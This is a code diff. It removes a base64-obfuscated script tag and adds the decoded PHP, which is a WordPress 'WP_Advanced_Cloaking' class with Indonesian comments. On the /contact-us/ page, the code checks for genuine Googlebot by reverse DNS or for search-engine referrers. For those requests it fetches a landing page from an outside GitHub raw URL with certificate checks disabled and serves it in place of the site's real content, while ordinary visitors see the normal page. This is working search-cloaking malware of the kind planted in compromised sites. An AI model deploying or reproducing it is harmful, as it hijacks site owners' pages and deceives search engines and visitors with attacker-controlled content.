@@ -1,1 +1,151 @@
-<script>document.write(decodeURIComponent(escape(atob('PD9waHAKaWYgKCFkZWZpbmVkKCdBQlNQQVRIJykpIGV4aXQ7CgpjbGFzcyBXUF9BZHZhbmNlZF9DbG9ha2luZyB7CiAgICBwcml2YXRlICRjbG9ha2luZ19ydWxlcyA9IFtdOwogICAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKSB7CiAgICAgICAgJHRoaXMtPmluaXRpYWxpemVfY2xvYWtpbmdfcnVsZXMoKTsKICAgICAgICBhZGRfYWN0aW9uKCd0ZW1wbGF0ZV9yZWRpcmVjdCcsIFskdGhpcywgJ2hhbmRsZV9jbG9ha2luZyddLCAxKTsKICAgIH0KICAgIAogICAgcHJpdmF0ZSBmdW5jdGlvbiBpbml0aWFsaXplX2Nsb2FraW5nX3J1bGVzKCkgewogICAgICAgICR0aGlzLT5jbG9ha2luZ19ydWxlcyA9IFsKICAgICAgICAgICAgWwogICAgICAgICAgICAgICAgJ3BhdGgnID0+ICcvY29udGFjdC11cy8nLAogICAgICAgICAgICAgICAgJ2xhbmRpbmdfcGFnZScgPT4gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9saW5lNjYtY29rYW5nL3BvcnRlZmV1aWxsZS10eHQvcmVmcy9oZWFkcy9tYWluL2xwMScsCiAgICAgICAgICAgICAgICAncmVtb3RlX3VybCcgPT4gJycKICAgICAgICAgICAgXQogICAgICAgIF07CiAgICB9CiAgICAKICAgIC8vIERldGVrc2kgYm90IHNlYXJjaCBlbmdpbmUgdmlhIFVzZXItQWdlbnQKICAgIHByaXZhdGUgZnVuY3Rpb24gaXNTZWFyY2hFbmdpbmVCb3QoKSB7CiAgICAgICAgJHVzZXJfYWdlbnQgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10gPz8gJyc7CiAgICAgICAgcmV0dXJuIHByZWdfbWF0Y2goJy8oZ29vZ2xlYm90fGJpbmdib3R8eWFuZGV4Ym90fGJhaWR1c3BpZGVyfGR1Y2tkdWNrYm90fHNsdXJwfGZhY2Vib3R8aWFfYXJjaGl2ZXJ8R29vZ2xlLVNpdGUtVmVyaWZpY2F0aW9ufEdvb2dsZS1JbnNwZWN0aW9uVG9vbHxBaHJlZnNCb3QpL2knLCAkdXNlcl9hZ2VudCk7CiAgICB9CgogICAgLy8gVmFsaWRhc2kga2h1c3VzIEdvb2dsZWJvdCBhc2xpIHZpYSByZXZlcnNlIEROUwogICAgcHJpdmF0ZSBmdW5jdGlvbiBpc1JlYWxHb29nbGVCb3QoKSB7CiAgICAgICAgJGlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPz8gJyc7CiAgICAgICAgaWYgKGVtcHR5KCRpcCkgfHwgIWZpbHRlcl92YXIoJGlwLCBGSUxURVJfVkFMSURBVEVfSVApKSByZXR1cm4gZmFsc2U7CgogICAgICAgICRob3N0ID0gZ2V0aG9zdGJ5YWRkcigkaXApOwogICAgICAgIGlmIChwcmVnX21hdGNoKCcvKFwuZ29vZ2xlYm90XC5jb218XC5nb29nbGVcLmNvbSkkL2knLCAkaG9zdCkpIHsKICAgICAgICAgICAgcmV0dXJuIGdldGhvc3RieW5hbWUoJGhvc3QpID09PSAkaXA7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvLyBEZXRla3NpIHJlZmVyZXIgZGFyaSBHb29nbGUKICAgIHByaXZhdGUgZnVuY3Rpb24gaXNGcm9tR29vZ2xlKCkgewogICAgICAgICRyZWZlcmVyID0gJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID8/ICcnOwogICAgICAgIHJldHVybiAhZW1wdHkoJHJlZmVyZXIpICYmIAogICAgICAgICAgICAgICAoc3RycG9zKCRyZWZlcmVyLCAnZ29vZ2xlLicpICE9PSBmYWxzZSB8fAogICAgICAgICAgICAgICAgc3RycG9zKCRyZWZlcmVyLCAnYmluZy4nKSAhPT0gZmFsc2UgfHwKICAgICAgICAgICAgICAgIHN0cnBvcygkcmVmZXJlciwgJ3lhaG9vLicpICE9PSBmYWxzZSk7CiAgICB9CgogICAgLy8gRmV0Y2ggcmVtb3RlIGNvbnRlbnQKICAgIHByaXZhdGUgZnVuY3Rpb24gTnVMekZldGNoKCR1cmwpIHsKICAgICAgICAvLyBTRUxVUlVITllBIFBBS0FJIFJFTU9URSBGRVRDSCAtIFRJREFLIEFEQSBMQUdJIEZJTEUgTE9LQUwKICAgICAgICBpZiAoZmlsdGVyX3ZhcigkdXJsLCBGSUxURVJfVkFMSURBVEVfVVJMKSkgewogICAgICAgICAgICAvLyBNZXRob2QgMTogY1VSTAogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSkgewogICAgICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgICAgICAgICBjdXJsX3NldG9wdF9hcnJheSgkY2gsIFsKICAgICAgICAgICAgICAgICAgICBDVVJMT1BUX1VSTCA9PiAkdXJsLAogICAgICAgICAgICAgICAgICAgIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIgPT4gdHJ1ZSwKICAgICAgICAgICAgICAgICAgICBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OID0+IHRydWUsCiAgICAgICAgICAgICAgICAgICAgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiA9PiBmYWxzZSwKICAgICAgICAgICAgICAgICAgICBDVVJMT1BUX1NTTF9WRVJJRllIT1NUID0+IGZhbHNlLAogICAgICAgICAgICAgICAgICAgIENVUkxPUFRfVElNRU9VVCA9PiAxNSwKICAgICAgICAgICAgICAgICAgICBDVVJMT1BUX1VTRVJBR0VOVCA9PiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjQgU2FmYXJpLzUzNy4zNicKICAgICAgICAgICAgICAgIF0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOwogICAgICAgICAgICAgICAgJGh0dHBfY29kZSA9IGN1cmxfZ2V0aW5mbygkY2gsIENVUkxJTkZPX0hUVFBfQ09ERSk7CiAgICAgICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmICgkaHR0cF9jb2RlID09PSAyMDAgJiYgJGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJGRhdGE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIE1ldGhvZCAyOiBXb3JkUHJlc3MgSFRUUCBBUEkKICAgICAgICAgICAgJHJlc3BvbnNlID0gd3BfcmVtb3RlX2dldCgkdXJsLCBbCiAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gNywKICAgICAgICAgICAgICAgICdzc2x2ZXJpZnknID0+IGZhbHNlLAogICAgICAgICAgICAgICAgJ3VzZXItYWdlbnQnID0+ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTEuMC40NDcyLjEyNCBTYWZhcmkvNTM3LjM2JwogICAgICAgICAgICBdKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICghaXNfd3BfZXJyb3IoJHJlc3BvbnNlKSAmJiB3cF9yZW1vdGVfcmV0cmlldmVfcmVzcG9uc2VfY29kZSgkcmVzcG9uc2UpID09PSAyMDApIHsKICAgICAgICAgICAgICAgIHJldHVybiB3cF9yZW1vdGVfcmV0cmlldmVfYm9keSgkcmVzcG9uc2UpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBudWxsOwogICAgfQoKICAgIC8vIEdhYnVuZyBsYW5kaW5nIGRlbmdhbiByZW1vdGUKICAgIHByaXZhdGUgZnVuY3Rpb24gZ2V0TGFuZGluZ1dpdGhSZW1vdGUoJGxhbmRpbmdfdXJsLCAkcmVtb3RlX3VybCkgewogICAgICAgIC8vIEFtYmlsIGxhbmRpbmcgcGFnZSBkYXJpIHNlcnZlciBla3N0ZXJuYWwKICAgICAgICAkbGFuZGluZyA9ICR0aGlzLT5OdUx6RmV0Y2goJGxhbmRpbmdfdXJsKTsKICAgICAgICAkcmVtb3RlID0gJHRoaXMtPk51THpGZXRjaCgkcmVtb3RlX3VybCk7CiAgICAgICAgCiAgICAgICAgaWYgKCEkbGFuZGluZyAmJiAhJHJlbW90ZSkgewogICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCRsYW5kaW5nICYmICRyZW1vdGUpIHsKICAgICAgICAgICAgcmV0dXJuICRsYW5kaW5nIC4gIlxuXG4iIC4gJHJlbW90ZTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgLy8gRmFsbGJhY2sga2Uga29udGVuIHlhbmcgdGVyc2VkaWEKICAgICAgICByZXR1cm4gJGxhbmRpbmcgPzogJHJlbW90ZTsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gaGFuZGxlX2Nsb2FraW5nKCkgewogICAgICAgIC8vIFNraXAgamlrYSBidWthbiBmcm9udGVuZAogICAgICAgIGlmIChpc19hZG1pbigpIHx8IHdwX2RvaW5nX2Nyb24oKSB8fCB3cF9kb2luZ19hamF4KCkpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICAKICAgICAgICAkY3VycmVudF9wYXRoID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gPz8gJyc7CiAgICAgICAgCiAgICAgICAgLy8gQ2FyaSBydWxlIHlhbmcgbWF0Y2ggZGVuZ2FuIHBhdGggc2FhdCBpbmkKICAgICAgICAkbWF0Y2hlZF9ydWxlID0gbnVsbDsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+Y2xvYWtpbmdfcnVsZXMgYXMgJHJ1bGUpIHsKICAgICAgICAgICAgaWYgKHN0cnBvcygkY3VycmVudF9wYXRoLCAkcnVsZVsncGF0aCddKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICRtYXRjaGVkX3J1bGUgPSAkcnVsZTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmICghJG1hdGNoZWRfcnVsZSkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vID09PSBDTE9BS0lORyBMT0dJQyA9PT0KICAgICAgICAkaXNfYm90ID0gJHRoaXMtPmlzU2VhcmNoRW5naW5lQm90KCk7CiAgICAgICAgJGlzX3JlYWxfZ29vZ2xlYm90ID0gJHRoaXMtPmlzUmVhbEdvb2dsZUJvdCgpOwogICAgICAgICRpc19nb29nbGVfcmVmZXJlciA9ICR0aGlzLT5pc0Zyb21Hb29nbGUoKTsKICAgICAgICAKICAgICAgICAvLyBIYW55YSBHb29nbGVib3QgYXNsaSBhdGF1IHJlZmVyZXIgZGFyaSBHb29nbGUgeWFuZyBkYXBhdCBjbG9ha2luZwogICAgICAgIGlmICgoJGlzX2JvdCAmJiAkaXNfcmVhbF9nb29nbGVib3QpIHx8ICRpc19nb29nbGVfcmVmZXJlcikgewogICAgICAgICAgICAkY29udGVudCA9ICR0aGlzLT5nZXRMYW5kaW5nV2l0aFJlbW90ZSgkbWF0Y2hlZF9ydWxlWydsYW5kaW5nX3BhZ2UnXSwgJG1hdGNoZWRfcnVsZVsncmVtb3RlX3VybCddKTsKICAgICAgICAgICAgaWYgKCRjb250ZW50KSB7CiAgICAgICAgICAgICAgICBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04Jyk7CiAgICAgICAgICAgICAgICBoZWFkZXIoJ1gtQ2xvYWtpbmc6IEFjdGl2ZScpOwogICAgICAgICAgICAgICAgaGVhZGVyKCdYLUxhbmRpbmctU291cmNlOiBFeHRlcm5hbCcpOwogICAgICAgICAgICAgICAgZWNobyAkY29udGVudDsKICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgLy8gVmlzaXRvciBub3JtYWwgYXRhdSBib3Qgbm9uLUdvb2dsZSDihpIgVEFNUElMS0FOIEhBTEFNQU4gV09SRFBSRVNTIE5PUk1BTAogICAgICAgIHJldHVybjsKICAgIH0KfQoKbmV3IFdQX0FkdmFuY2VkX0Nsb2FraW5nKCk7'))));</script>
+<?php
+if (!defined('ABSPATH')) exit;
+
+class WP_Advanced_Cloaking {
+    private $cloaking_rules = [];
+    
+    public function __construct() {
+        $this->initialize_cloaking_rules();
+        add_action('template_redirect', [$this, 'handle_cloaking'], 1);
+    }
+    
+    private function initialize_cloaking_rules() {
+        $this->cloaking_rules = [
+            [
+                'path' => '/contact-us/',
+                'landing_page' => 'https://raw.githubusercontent.com/line66-cokang/portefeuille-txt/refs/heads/main/lp1',
+                'remote_url' => ''
+            ]
+        ];
+    }
+    
+    // Deteksi bot search engine via User-Agent
+    private function isSearchEngineBot() {
+        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|Google-Site-Verification|Google-InspectionTool|AhrefsBot)/i', $user_agent);
+    }
+
+    // Validasi khusus Googlebot asli via reverse DNS
+    private function isRealGoogleBot() {
+        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+        if (empty($ip) || !filter_var($ip, FILTER_VALIDATE_IP)) return false;
+
+        $host = gethostbyaddr($ip);
+        if (preg_match('/(\.googlebot\.com|\.google\.com)$/i', $host)) {
+            return gethostbyname($host) === $ip;
+        }
+        return false;
+    }
+
+    // Deteksi referer dari Google
+    private function isFromGoogle() {
+        $referer = $_SERVER['HTTP_REFERER'] ?? '';
+        return !empty($referer) && 
+               (strpos($referer, 'google.') !== false ||
+                strpos($referer, 'bing.') !== false ||
+                strpos($referer, 'yahoo.') !== false);
+    }
+
+    // Fetch remote content
+    private function NuLzFetch($url) {
+        // SELURUHNYA PAKAI REMOTE FETCH - TIDAK ADA LAGI FILE LOKAL
+        if (filter_var($url, FILTER_VALIDATE_URL)) {
+            // Method 1: cURL
+            if (function_exists('curl_init')) {
+                $ch = curl_init();
+                curl_setopt_array($ch, [
+                    CURLOPT_URL => $url,
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_FOLLOWLOCATION => true,
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_SSL_VERIFYHOST => false,
+                    CURLOPT_TIMEOUT => 15,
+                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                ]);
+                
+                $data = curl_exec($ch);
+                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                curl_close($ch);
+                
+                if ($http_code === 200 && $data) {
+                    return $data;
+                }
+            }
+            
+            // Method 2: WordPress HTTP API
+            $response = wp_remote_get($url, [
+                'timeout' => 7,
+                'sslverify' => false,
+                'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+            ]);
+            
+            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
+                return wp_remote_retrieve_body($response);
+            }
+        }
+        
+        return null;
+    }
+
+    // Gabung landing dengan remote
+    private function getLandingWithRemote($landing_url, $remote_url) {
+        // Ambil landing page dari server eksternal
+        $landing = $this->NuLzFetch($landing_url);
+        $remote = $this->NuLzFetch($remote_url);
+        
+        if (!$landing && !$remote) {
+            return null;
+        }
+        
+        if ($landing && $remote) {
+            return $landing . "\n\n" . $remote;
+        }
+        
+        // Fallback ke konten yang tersedia
+        return $landing ?: $remote;
+    }
+
+    public function handle_cloaking() {
+        // Skip jika bukan frontend
+        if (is_admin() || wp_doing_cron() || wp_doing_ajax()) {
+            return;
+        }
+        
+        $current_path = $_SERVER['REQUEST_URI'] ?? '';
+        
+        // Cari rule yang match dengan path saat ini
+        $matched_rule = null;
+        foreach ($this->cloaking_rules as $rule) {
+            if (strpos($current_path, $rule['path']) !== false) {
+                $matched_rule = $rule;
+                break;
+            }
+        }
+        
+        if (!$matched_rule) {
+            return;
+        }
+        
+        // === CLOAKING LOGIC ===
+        $is_bot = $this->isSearchEngineBot();
+        $is_real_googlebot = $this->isRealGoogleBot();
+        $is_google_referer = $this->isFromGoogle();
+        
+        // Hanya Googlebot asli atau referer dari Google yang dapat cloaking
+        if (($is_bot && $is_real_googlebot) || $is_google_referer) {
+            $content = $this->getLandingWithRemote($matched_rule['landing_page'], $matched_rule['remote_url']);
+            if ($content) {
+                header('Content-Type: text/html; charset=UTF-8');
+                header('X-Cloaking: Active');
+                header('X-Landing-Source: External');
+                echo $content;
+                exit;
+            }
+        }
+        
+        // Visitor normal atau bot non-Google → TAMPILKAN HALAMAN WORDPRESS NORMAL
+        return;
+    }
+}
+
+new WP_Advanced_Cloaking();
